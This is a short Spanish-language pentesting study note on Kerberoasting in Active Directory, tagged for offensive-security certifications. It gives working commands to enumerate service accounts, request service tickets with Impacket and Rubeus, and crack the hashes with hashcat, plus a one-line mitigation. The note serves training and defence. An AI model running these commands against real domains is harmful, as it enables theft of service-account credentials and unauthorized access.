---
title: Kerberoasting
tags: [active-directory, kerberos, oscp, crte, crto, cpts]
---

## Qué es

Un usuario de dominio autenticado puede solicitar un Service Ticket (TGS) para cualquier SPN registrado. Ese ticket viene cifrado con el hash NTLM de la cuenta de servicio — si esa cuenta tiene una contraseña débil, se puede crackear offline sin necesidad de privilegios adicionales.

## Enumerar cuentas con SPN

```powershell
setspn.exe -Q */*
Get-DomainUser -SPN
```

## Pedir los tickets y extraer los hashes

```bash
# Impacket
GetUserSPNs.py dominio.local/usuario:password -dc-ip 10.10.10.10 -request

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
```

## Crackear

```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

## Mitigación

Contraseñas largas/aleatorias en cuentas de servicio, o usar gMSA (Group Managed Service Accounts) para que la contraseña rote sola.
